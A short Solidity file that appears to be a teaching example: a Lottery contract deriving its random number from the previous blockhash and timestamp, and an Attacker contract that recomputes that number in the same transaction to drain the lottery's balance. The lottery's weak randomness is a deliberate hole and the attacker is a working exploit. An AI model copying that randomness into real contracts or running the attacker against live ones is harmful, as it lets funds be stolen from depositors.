// SPDX-License-Identifier: MIT

pragma solidity 0.6.7;

contract Lottery {

	constructor () public payable {}

	function guessRandomNumber(uint _guess) public {

		uint answer = uint(keccak256(abi.encodePacked(
			blockhash(block.number -1),
			block.timestamp
		)));

		if (_guess == answer){
			(bool success, ) = msg.sender.call {value: address(this).balance}("win");
			require(success, "Transaction failed");
		}

	}
}

contract Attacker {

	event Received(address, uint);

	fallback() external payable {}
	receive() external payable {}

	function attack(Lottery lottery) public {

		uint answer = uint(keccak256(abi.encodePacked(
			blockhash(block.number -1),
			block.timestamp
		)));

		lottery.guessRandomNumber(answer);

		(bool success, ) = payable(msg.sender).call {value: address(this).balance}("");
		require(success, "Transaction failed");

	}

}
